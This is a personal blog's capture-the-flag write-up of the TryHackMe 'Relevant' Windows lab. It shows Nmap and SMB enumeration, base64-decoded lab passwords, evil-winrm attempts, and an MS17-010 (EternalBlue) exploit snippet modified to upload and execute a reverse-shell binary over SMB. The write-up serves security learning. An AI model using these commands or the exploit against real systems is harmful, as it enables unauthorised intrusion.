@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>TryHackMe - Relevant | All Things Cyber – joonkim0625</title>
+<meta name="keywords" content="ctf, tryHackMe, cybersecurity, windows, smb, nmap, ms17-010">
+<meta name="description" content="Challenge: Relevant
+Recon
+NMAP
+I was not able to find any clues from the initial Nmap scans and other tools
+that I used. So I looked up the official writeup, and the author suggests to run
+a scan that detects the open ports and then run more focused Nmap scan on them.
+He created a tool threader3000 and I decided to give it a try.
+The result showed that port 80, 139, 135, 445, 3389, 5985, 49663, 49666, and
+49668. And these 40,000s are commonly used for backend operations within virtual
+environments such as AWS.">
+<meta name="author" content="Joon Kim">
+<link rel="canonical" href="https://joonkim0625.github.io/posts/2023-6-29-thm-relevant/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://joonkim0625.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://joonkim0625.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://joonkim0625.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://joonkim0625.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://joonkim0625.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://joonkim0625.github.io/posts/2023-6-29-thm-relevant/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://joonkim0625.github.io/posts/2023-6-29-thm-relevant/">
+  <meta property="og:site_name" content="All Things Cyber – joonkim0625">
+  <meta property="og:title" content="TryHackMe - Relevant">
+  <meta property="og:description" content="Challenge: Relevant Recon NMAP I was not able to find any clues from the initial Nmap scans and other tools that I used. So I looked up the official writeup, and the author suggests to run a scan that detects the open ports and then run more focused Nmap scan on them. He created a tool threader3000 and I decided to give it a try.
+The result showed that port 80, 139, 135, 445, 3389, 5985, 49663, 49666, and 49668. And these 40,000s are commonly used for backend operations within virtual environments such as AWS.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-06-29T22:00:00+00:00">
+    <meta property="article:modified_time" content="2023-06-29T22:00:00+00:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="TryHackMe">
+    <meta property="article:tag" content="Cybersecurity">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="SMB">
+    <meta property="article:tag" content="Nmap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TryHackMe - Relevant">
+<meta name="twitter:description" content="Challenge: Relevant
+Recon
+NMAP
+I was not able to find any clues from the initial Nmap scans and other tools
+that I used. So I looked up the official writeup, and the author suggests to run
+a scan that detects the open ports and then run more focused Nmap scan on them.
+He created a tool threader3000 and I decided to give it a try.
+The result showed that port 80, 139, 135, 445, 3389, 5985, 49663, 49666, and
+49668. And these 40,000s are commonly used for backend operations within virtual
+environments such as AWS.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://joonkim0625.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "TryHackMe - Relevant",
+      "item": "https://joonkim0625.github.io/posts/2023-6-29-thm-relevant/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "TryHackMe - Relevant",
+  "name": "TryHackMe - Relevant",
+  "description": "Challenge: Relevant Recon NMAP I was not able to find any clues from the initial Nmap scans and other tools that I used. So I looked up the official writeup, and the author suggests to run a scan that detects the open ports and then run more focused Nmap scan on them. He created a tool threader3000 and I decided to give it a try.\nThe result showed that port 80, 139, 135, 445, 3389, 5985, 49663, 49666, and 49668. And these 40,000s are commonly used for backend operations within virtual environments such as AWS.\n",
+  "keywords": [
+    "ctf", "tryHackMe", "cybersecurity", "windows", "smb", "nmap", "ms17-010"
+  ],
+  "articleBody": "Challenge: Relevant Recon NMAP I was not able to find any clues from the initial Nmap scans and other tools that I used. So I looked up the official writeup, and the author suggests to run a scan that detects the open ports and then run more focused Nmap scan on them. He created a tool threader3000 and I decided to give it a try.\nThe result showed that port 80, 139, 135, 445, 3389, 5985, 49663, 49666, and 49668. And these 40,000s are commonly used for backend operations within virtual environments such as AWS.\nOnce his Python script finishes the port scanning, it suggests a nmap command to run. The result is:\nPORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=Relevant | Not valid before: 2023-06-27T17:18:59 |_Not valid after: 2023-12-27T17:18:59 |_ssl-date: 2023-06-28T18:10:32+00:00; +1s from scanner time. | rdp-ntlm-info: | Target_Name: RELEVANT | NetBIOS_Domain_Name: RELEVANT | NetBIOS_Computer_Name: RELEVANT | DNS_Domain_Name: Relevant | DNS_Computer_Name: Relevant | Product_Version: 10.0.14393 |_ System_Time: 2023-06-28T18:09:52+00:00 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49663/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC MAC Address: 02:CF:CE:A0:45:4F (Unknown) Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s | smb2-time: | date: 2023-06-28T18:09:51 |_ start_date: 2023-06-28T17:19:24 |_nbstat: NetBIOS name: RELEVANT, NetBIOS user: , NetBIOS MAC: 02cfcea0454f (unknown) | smb-os-discovery: | OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3) | Computer name: Relevant | NetBIOS computer name: RELEVANT\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-06-28T11:09:52-07:00 | smb2-security-mode: | 311: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 97.54 seconds Port 80 If we access the web page, we will see a default web page that indicates it is for Windows Server Internet Information Services. This tells us that there is a web server running but that is about it. The nmap result shows it is using Microsoft IIS 10.0 (which was considered as the highest version at that moment and still it is), we are not likely to find any vulnerabilities related to this.\nPort 445: SMB Since SMB is open, we will run:\nsmbclient -L \\\\\\\\\\\\.\nThe result shows:\nsmbclient -L 10.10.240.251 Password for [WORKGROUP\\root]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC nt4wrksv Disk Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.240.251 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available I didn’t think about checking the sharename ’nt4wrksv’, but the author did check on the share. Let’s check that share by running:\nsmbclient \\\\\\\\10.10.240.251\\\\nt4wrksv\nOnce you get in without entering any password, you will be able see a text file password.txt if you run dir command. The content of the password file is\n[User Passwords - Encoded] Qm9iIC0gIVBAJCRXMHJEITEyMw== QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk It looks like base64-encoded strings. We can either use online tools or use base64 command line tool to decrypt this.\necho \" | base64 -d\"\nThe result of decrypting the first line is Bob - !P@$$W0rD!123. The second line gives you Bill - Juw4nnaM4n420696969!$$$. What could we do with these credentials? We can try these credentials on evil-winrm.\nevil-winrm -i -u -p However, the author has put this in to show people that sometimes somethings are too good to be true (meaning these passwords are useless). And he stresses that ‘believe in what you see - if those credentials do not work for anything, that means they are nothing’.\nNote: We can also try to use psexec.py. Take a look at this.\nPort 3389 Since port 3389 is open, I ran a nmap scripts that would check for rdp related vulnerabilities.\nnmap --script \"rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info\" -p 3389 -T4 Nothing was found. So I think running tools such as crackmapexec wouldn’t matter at this point since there is not an account that is interesting to be used.\nPort 49663 Oh well, I don’t know how/why I did not think about looking at this port when it apparently shows the second web server - another Microsoft IIS. And it shows that there is a potentially risky HTTP method TRACE. According to OWASP, this can be used as a Cross-Site Tracking (XST) - referencel. So I tried this example command from the article curl -X TRACE :49663, but it did not give anything back.\nThe author uses dirsearch which I don’t think I used before, so I will give it a shot. He uses a command that looks like this:\ndirsearch.py -u -e -x 400,500 -r -t 100 -w -u: URL -e: All extensions -x: Exclude ports specified -r: Brute-force recursively (a single level) -t: Number of threads used -w: File path to a word list Warning: Somehow I was not able to run dirsearch on the server. So, instead, I ran gobuster instead.\ngobuster dir -u -w After the run, you will see that there is one match, nt4wrksv directory which we saw from one of the sharenames. So, after finding that out, if I go to /nt4wrksv, it shows a blank page in black.\nVulnerability Check Maybe, once we find out the open ports from the Nmap scans, I should try to run this command to see if there are any known vulnerabilities:\nnmap -oA nmap-vuln -Pn -script vuln -p 80,135,139,445,3389 Although I have run vulnerability searches related to SMB and RDP, but this will do the whole vulnerabilities that it can find.\nnmap -Pn --script vuln -p 80,135,139,445,3389 10.10.245.179 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-28 20:15 UTC Nmap scan report for ip-10-10-245-179.eu-west-1.compute.internal (10.10.245.179) Host is up (0.0066s latency). PORT STATE SERVICE 80/tcp open http |_http-dombased-xss: Couldn't find any DOM based XSS. |_http-stored-xss: Couldn't find any stored XSS vulnerabilities. |_http-csrf: Couldn't find any CSRF vulnerabilities. 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server MAC Address: 02:CF:DF:34:15:2B (Unknown) Host script results: |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug) |_smb-vuln-ms10-054: false | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 Nmap done: 1 IP address (1 host up) scanned in 200.99 seconds The result shows that there can be ms17-010 which indicates EternalBlue vulnerability. I knew this! I should have known this when I saw that SMBv1 was listed (although I was trying to make the exploit work but could not).\nMS17-010 There are two ways Follow the author’s instruction Somehow make the AutoBlue script work by fixing the indentation problem… The author’s way What the author does to see if the server is exploitable is by checking to see if the server somehow uses the same directory as the SMB share!\nSo, if we were to test accessing/nt4wrksv/passwords.txt, we will see the contents of passwords.txt. So, knowing this, using smbclient, we can upload a reverse shell onto the system simply (he did choose to use a .aspx extension as Windows IIS servers use many of those file extensions). After that, he checks what kind of privilege the user account has and do further exploitations there to escalate the privilege - writeup.\nUsing original 42315.py Indentation correction in python - https://iqbalnaved.wordpress.com/2013/12/09/vim-tip-how-to-fix-python-exception-indentationerror/\nThis was something that I had to resolve when using VM’s default vim where, after modifying code, it would complain about wrong indentations.\nOriginal MS17-010 python script from exploit-db.com Referred to: https://infosecwriteups.com/tryhackme-relevant-ctf-write-up-7705501b73dd\nhttps://www.exploit-db.com/exploits/42315\nThis was written for python2 versions so I had to use Python2.7 If pip2.7 isot installed, you can do: wget https://bootstrap.pypa.io/pipi/2.7/get-pip.py if doesn’t work, run curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py instead run the get-pip.py with python2.7 once pip2.7 is installed, you will need the impacket module: pip2.7 install --update setuptools pip2.7 install impacket If there are username, password that you can use, modify the script to enter them\nTo launch a reverse shell (have a reverse shell ready), changing some code is required\nusing smb_send_file() and service_exec() instead of the five lines above them def smb_pwn(conn, arch): smbConn = conn.get_smbconnection() #print('creating file c:\\\\pwned.txt on the target') #tid2 = smbConn.connectTree('C$') #fid2 = smbConn.createFile(tid2, '/pwned.txt') #smbConn.closeFile(tid2, fid2) #smbConn.disconnectTree(tid2) smb_send_file(smbConn, 'rev.exe', 'C', '/rev.exe') service_exec(conn, r'c:\\rev.exe') # Note: there are many methods to get shell over SMB admin session # a simple method to get shell (but easily to be detected by AV) is # executing binary generated by \"msfvenom -f exe-service ...\" Python 3 working version of MS17-010 scripts: https://github.com/3ndG4me/AutoBlue-MS17-010/tree/master Didn’t get to work this script out Overall, this challenge allowed me to learn how to use/modify the resources that I can find online and adjust the way they are used for my own cases. Another interesting challenge!\n",
+  "wordCount" : "1575",
+  "inLanguage": "en",
+  "datePublished": "2023-06-29T22:00:00Z",
+  "dateModified": "2023-06-29T22:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Joon Kim"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://joonkim0625.github.io/posts/2023-6-29-thm-relevant/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "All Things Cyber – joonkim0625",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://joonkim0625.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://joonkim0625.github.io/" accesskey="h" title="All Things Cyber – joonkim0625 (Alt + H)">All Things Cyber – joonkim0625</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://joonkim0625.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      TryHackMe - Relevant
+    </h1>
+    <div class="post-meta"><span title='2023-06-29 22:00:00 +0000 UTC'>June 29, 2023</span>&nbsp;·&nbsp;Joon Kim
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="challenge-relevant">Challenge: Relevant<a hidden class="anchor" aria-hidden="true" href="#challenge-relevant">#</a></h2>
+<h2 id="recon">Recon<a hidden class="anchor" aria-hidden="true" href="#recon">#</a></h2>
+<h3 id="nmap">NMAP<a hidden class="anchor" aria-hidden="true" href="#nmap">#</a></h3>
+<p>I was not able to find any clues from the initial Nmap scans and other tools
+that I used. So I looked up the official writeup, and the author suggests to run
+a scan that detects the open ports and then run more focused Nmap scan on them.
+He created a tool <code>threader3000</code> and I decided to give it a try.</p>
+<p>The result showed that port 80, 139, 135, 445, 3389, 5985, 49663, 49666, and
+49668. And these 40,000s are commonly used for backend operations within virtual
+environments such as AWS.</p>
+<p>Once his Python script finishes the port scanning, it suggests a nmap command to
+run. The result is:</p>
+<pre tabindex="0"><code>PORT      STATE SERVICE       VERSION 80/tcp    open  http
+Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |
+http-methods: |_  Potentially risky methods: TRACE |_http-title: IIS Windows
+Server 135/tcp   open  msrpc         Microsoft Windows RPC 139/tcp   open
+netbios-ssn   Microsoft Windows netbios-ssn 445/tcp   open  microsoft-ds
+Windows Server 2016 Standard Evaluation 14393 microsoft-ds 3389/tcp  open
+ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject:
+commonName=Relevant | Not valid before: 2023-06-27T17:18:59 |_Not valid after:
+2023-12-27T17:18:59 |_ssl-date: 2023-06-28T18:10:32+00:00; +1s from scanner
+time. | rdp-ntlm-info: |   Target_Name: RELEVANT |   NetBIOS_Domain_Name:
+RELEVANT |   NetBIOS_Computer_Name: RELEVANT |   DNS_Domain_Name: Relevant |
+DNS_Computer_Name: Relevant |   Product_Version: 10.0.14393 |_  System_Time:
+2023-06-28T18:09:52+00:00 5985/tcp  open  http          Microsoft HTTPAPI httpd
+2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not
+Found 49663/tcp open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0 | http-methods: |_  Potentially risky
+methods: TRACE |_http-title: IIS Windows Server 49667/tcp open  msrpc
+Microsoft Windows RPC 49669/tcp open  msrpc         Microsoft Windows RPC MAC
+Address: 02:CF:CE:A0:45:4F (Unknown) Service Info: OSs: Windows, Windows Server
+2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results: | smb-security-mode: |   account_used: guest |
+authentication_level: user |   challenge_response: supported |_
+message_signing: disabled (dangerous, but default) |_clock-skew: mean: 1h24m00s,
+deviation: 3h07m50s, median: 0s | smb2-time: |   date: 2023-06-28T18:09:51 |_
+start_date: 2023-06-28T17:19:24 |_nbstat: NetBIOS name: RELEVANT, NetBIOS user:
+&lt;unknown&gt;, NetBIOS MAC: 02cfcea0454f (unknown) | smb-os-discovery: |   OS:
+Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard
+Evaluation 6.3) |   Computer name: Relevant |   NetBIOS computer name:
+RELEVANT\x00 |   Workgroup: WORKGROUP\x00 |_  System time:
+2023-06-28T11:09:52-07:00 | smb2-security-mode: |   311: |_    Message signing
+enabled but not required
+
+Service detection performed. Please report any incorrect results at
+https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 97.54
+seconds
+</code></pre><h3 id="port-80">Port 80<a hidden class="anchor" aria-hidden="true" href="#port-80">#</a></h3>
+<p>If we access the web page, we will see a default web page that indicates it is
+for Windows Server Internet Information Services.  This tells us that there is a
+web server running but that is about it. The nmap result shows it is using
+Microsoft IIS 10.0 (which was considered as the highest version at that moment
+and still it is), we are not likely to find any vulnerabilities related to this.</p>
+<h3 id="port-445-smb">Port 445: SMB<a hidden class="anchor" aria-hidden="true" href="#port-445-smb">#</a></h3>
+<p>Since SMB is open, we will run:</p>
+<p><code>smbclient -L \\\\&lt;IP&gt;\\</code>.</p>
+<p>The result shows:</p>
+<pre tabindex="0"><code>smbclient -L 10.10.240.251 Password for [WORKGROUP\root]:
+
+Sharename       Type      Comment ---------       ----      ------- ADMIN$
+Disk      Remote Admin C$              Disk      Default share IPC$
+IPC       Remote IPC nt4wrksv        Disk      Reconnecting with SMB1 for
+workgroup listing. do_connect: Connection to 10.10.240.251 failed (Error
+NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup
+available
+</code></pre><p>I didn&rsquo;t think about checking the sharename &rsquo;nt4wrksv&rsquo;, but the author did check
+on the share. Let&rsquo;s check that share by running:</p>
+<p><code>smbclient \\\\10.10.240.251\\nt4wrksv</code></p>
+<p>Once you get in without entering any password, you will be able see a text file
+<code>password.txt</code> if you run <code>dir</code> command. The content of the password file is</p>
+<pre tabindex="0"><code>[User Passwords - Encoded] Qm9iIC0gIVBAJCRXMHJEITEyMw==
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+</code></pre><p>It looks like base64-encoded strings. We can either use online tools or use
+<code>base64</code> command line tool to decrypt this.</p>
+<p><code>echo &quot;&lt;some_base64-encoded_string&gt; | base64 -d&quot;</code></p>
+<p>The result of decrypting the first line is <code>Bob - !P@$$W0rD!123</code>. The second
+line gives you <code>Bill - Juw4nnaM4n420696969!$$$</code>. What could we do with these
+credentials? We can try these credentials on <code>evil-winrm</code>.</p>
+<p><code>evil-winrm -i &lt;ip&gt; -u &lt;username&gt; -p &lt;password&gt;</code></p>
+<p>However, the author has put this in to show people that sometimes somethings are
+too good to be true (meaning these passwords are useless). And he stresses that
+&lsquo;believe in what you see - if those credentials do not work for anything, that
+means they are nothing&rsquo;.</p>
+<p><strong>Note</strong>: We can also try to use <code>psexec.py</code>. Take a look at this.</p>
+<h3 id="port-3389">Port 3389<a hidden class="anchor" aria-hidden="true" href="#port-3389">#</a></h3>
+<p>Since port 3389 is open, I ran a nmap scripts that would check for rdp related
+vulnerabilities.</p>
+<p><code>nmap --script &quot;rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info&quot; -p 3389 -T4 &lt;IP&gt;</code></p>
+<p>Nothing was found. So I think running  tools such as <code>crackmapexec</code> wouldn&rsquo;t
+matter at this point since there is not an account that is interesting to be
+used.</p>
+<h3 id="port-49663">Port 49663<a hidden class="anchor" aria-hidden="true" href="#port-49663">#</a></h3>
+<p>Oh well, I don&rsquo;t know how/why I did not think about looking at this port when it
+apparently shows the second web server - another Microsoft IIS. And it shows
+that there is a potentially risky HTTP method <code>TRACE</code>. According to OWASP, this
+can be used as a <code>Cross-Site Tracking (XST)</code> -
+<a href="https://owasp.org/www-community/attacks/Cross_Site_Tracing">referencel</a>. So I
+tried this example command from the article <code>curl -X TRACE &lt;ip&gt;:49663</code>, but it
+did not give anything back.</p>
+<p>The author uses <code>dirsearch</code> which I don&rsquo;t think I used before, so I will give it
+a shot. He uses a command that looks like this:</p>
+<ul>
+<li><code>dirsearch.py -u &lt;ip&gt; -e -x 400,500 -r -t 100 -w &lt;path_to_wordlist&gt;</code> -u: URL</li>
+<li>-e: All extensions -x: Exclude ports specified -r: Brute-force recursively (a</li>
+<li>single level) -t: Number of threads used -w: File path to a word list</li>
+</ul>
+<p><strong>Warning</strong>: Somehow I was not able to run <code>dirsearch</code> on the server. So,
+instead, I ran <code>gobuster</code> instead.</p>
+<p><code>gobuster dir -u &lt;ip&gt; -w &lt;path_to_wordlist&gt;</code></p>
+<p>After the run, you will see that there is one match, <code>nt4wrksv</code> directory
+which we saw from one of the sharenames. So, after finding that out, if I go
+to <code>&lt;ip&gt;/nt4wrksv</code>, it shows a blank page in black.</p>
+<h2 id="vulnerability-check">Vulnerability Check<a hidden class="anchor" aria-hidden="true" href="#vulnerability-check">#</a></h2>
+<p>Maybe, once we find out the open ports from the Nmap scans, I should try to run
+this command to see if there are any known vulnerabilities:</p>
+<p><code>nmap -oA nmap-vuln -Pn -script vuln -p 80,135,139,445,3389 &lt;ip&gt;</code></p>
+<p>Although I have run vulnerability searches related to SMB and RDP, but this will
+do the whole vulnerabilities that it can find.</p>
+<pre tabindex="0"><code>nmap -Pn --script vuln -p 80,135,139,445,3389 10.10.245.179 Starting Nmap
+7.93 ( https://nmap.org ) at 2023-06-28 20:15 UTC Nmap scan report for
+ip-10-10-245-179.eu-west-1.compute.internal (10.10.245.179) Host is up (0.0066s
+latency).
+
+PORT     STATE SERVICE 80/tcp   open  http |_http-dombased-xss: Couldn&#39;t find
+any DOM based XSS. |_http-stored-xss: Couldn&#39;t find any stored XSS
+vulnerabilities. |_http-csrf: Couldn&#39;t find any CSRF vulnerabilities. 135/tcp
+open  msrpc 139/tcp  open  netbios-ssn 445/tcp  open  microsoft-ds 3389/tcp open
+ms-wbt-server MAC Address: 02:CF:DF:34:15:2B (Unknown)
+
+Host script results: |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d
+to debug) |_smb-vuln-ms10-054: false | smb-vuln-ms17-010: |   VULNERABLE: |
+Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) |
+State: VULNERABLE |     IDs:  CVE:CVE-2017-0143 |     Risk factor: HIGH |
+A critical remote code execution vulnerability exists in Microsoft SMBv1 |
+servers (ms17-010). |           |     Disclosure date: 2017-03-14 |
+References: |
+https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+
+Nmap done: 1 IP address (1 host up) scanned in 200.99 seconds
+</code></pre><p>The result shows that there can be ms17-010 which indicates <code>EternalBlue</code>
+vulnerability. I knew this! I should have known this when I saw that SMBv1 was
+listed (although I was trying to make the exploit work but could not).</p>
+<h2 id="ms17-010">MS17-010<a hidden class="anchor" aria-hidden="true" href="#ms17-010">#</a></h2>
+<h3 id="there-are-two-ways">There are two ways<a hidden class="anchor" aria-hidden="true" href="#there-are-two-ways">#</a></h3>
+<ol>
+<li>Follow the author&rsquo;s instruction</li>
+<li>Somehow make the AutoBlue script work by fixing the indentation problem&hellip;</li>
+</ol>
+<h4 id="the-authors-way">The author&rsquo;s way<a hidden class="anchor" aria-hidden="true" href="#the-authors-way">#</a></h4>
+<p>What the author does to see if the server is exploitable is by checking to see
+if the server somehow uses the same directory as the SMB share!</p>
+<p>So, if we were to test accessing<code>&lt;ip&gt;/nt4wrksv/passwords.txt</code>, we will see the
+contents of <code>passwords.txt</code>. So, knowing this, using smbclient, we can upload a
+reverse shell onto the system simply (he did choose to use a <code>.aspx</code> extension
+as Windows IIS servers use many of those file extensions). After that, he checks
+what kind of privilege the user account has and do further exploitations there
+to escalate the privilege -
+<a href="https://medium.themayor.tech/relevant-walk-through-on-tryhackme-f7dedfcb00dc">writeup</a>.</p>
+<h4 id="using-original-42315py">Using original 42315.py<a hidden class="anchor" aria-hidden="true" href="#using-original-42315py">#</a></h4>
+<p>Indentation correction in python -
+<a href="https://iqbalnaved.wordpress.com/2013/12/09/vim-tip-how-to-fix-python-exception-indentationerror/">https://iqbalnaved.wordpress.com/2013/12/09/vim-tip-how-to-fix-python-exception-indentationerror/</a></p>
+<p>This was something that I had to resolve when using VM&rsquo;s default vim where,
+after modifying code, it would complain about wrong indentations.</p>
+<ul>
+<li>Original MS17-010 python script from exploit-db.com Referred to:
+<ul>
+<li>
+<p><a href="https://infosecwriteups.com/tryhackme-relevant-ctf-write-up-7705501b73dd">https://infosecwriteups.com/tryhackme-relevant-ctf-write-up-7705501b73dd</a></p>
+</li>
+<li>
+<p><a href="https://www.exploit-db.com/exploits/42315">https://www.exploit-db.com/exploits/42315</a></p>
+<ul>
+<li>This was written for python2 versions so I had to use Python2.7</li>
+<li>If pip2.7 isot installed, you can do:</li>
+<li><code>wget https://bootstrap.pypa.io/pipi/2.7/get-pip.py</code>
+<ul>
+<li>if doesn&rsquo;t work, run <code>curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py</code> instead</li>
+</ul>
+</li>
+<li>run the <code>get-pip.py</code> with python2.7</li>
+<li>once pip2.7 is installed, you will need the impacket module:
+<ul>
